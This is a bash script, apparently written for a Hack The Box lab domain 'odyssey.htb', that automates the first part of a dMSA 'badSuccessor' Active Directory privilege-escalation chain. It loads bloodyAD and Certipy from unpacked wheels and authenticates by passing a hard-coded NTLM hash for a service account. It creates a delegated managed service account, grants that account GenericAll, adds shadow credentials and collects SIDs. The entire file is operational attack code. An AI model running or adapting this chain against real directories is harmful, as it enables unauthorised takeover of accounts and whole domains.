#!/bin/bash
# dMSA Ouroboros chain on web box
set -e
BH="bbc270509ec878cf516d5295fb4d774d"
export PYTHONPATH=/tmp/pylibs
export PATH="$HOME/.local/bin:$PATH"
cd /tmp

# ensure pylibs
if [ ! -d /tmp/pylibs/bloodyAD ]; then
  for w in /tmp/adwheels/*.whl; do
    python3 -c "import zipfile,sys; zipfile.ZipFile(sys.argv[1]).extractall('/tmp/pylibs')" "$w"
  done
  rm -rf /tmp/pylibs/cffi /tmp/pylibs/cffi-*.dist-info /tmp/pylibs/_cffi_backend* \
         /tmp/pylibs/cryptography /tmp/pylibs/cryptography-*.dist-info /tmp/pylibs/cryptography.libs \
         /tmp/pylibs/bcrypt /tmp/pylibs/bcrypt-*.dist-info \
         /tmp/pylibs/nacl /tmp/pylibs/PyNaCl* /tmp/pylibs/pynacl* 2>/dev/null || true
fi

bloody() {
  python3 -m bloodyAD "$@"
}

echo "=== writable ==="
bloody --host 172.16.0.10 -d odyssey.htb -u svc-aegis-build -p ":$BH" get writable --otype ALL --right ALL --detail 2>&1 | tee /tmp/bloody_writable.out | tail -40

echo "=== badSuccessor ==="
bloody --host 172.16.0.10 -d odyssey.htb -u svc-aegis-build -p ":$BH" add badSuccessor dmsa-pipe-deploy -t 'CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb' --ou 'OU=Migrations,DC=odyssey,DC=htb' 2>&1 | tee /tmp/bloody_bs.out || true

echo "=== genericAll ==="
bloody --host 172.16.0.10 -d odyssey.htb -u svc-aegis-build -p ":$BH" add genericAll 'CN=dmsa-pipe-deploy,OU=Migrations,DC=odyssey,DC=htb' svc-aegis-build 2>&1 | tee /tmp/bloody_ga.out || true

echo "=== shadow dmsa ==="
python3 - <<'PY'
import sys
from certipy.entry import main
sys.argv = ["certipy","shadow","add","-u","svc-aegis-build","-hashes",":bbc270509ec878cf516d5295fb4d774d","-account","dmsa-pipe-deploy$","-dc-ip","172.16.0.10"]
main()
PY

echo "=== sids ==="
bloody --host 172.16.0.10 -d odyssey.htb -u svc-aegis-build -p ":$BH" get object 'dmsa-pipe-deploy$' --attr objectSid 2>&1 | tee /tmp/dmsa_sid.out
bloody --host 172.16.0.10 -d odyssey.htb -u svc-aegis-build -p ":$BH" get object 'svc-aegis-build' --attr objectSid 2>&1 | tee /tmp/build_sid.out

echo DMSA_CHAIN_PART1_DONE
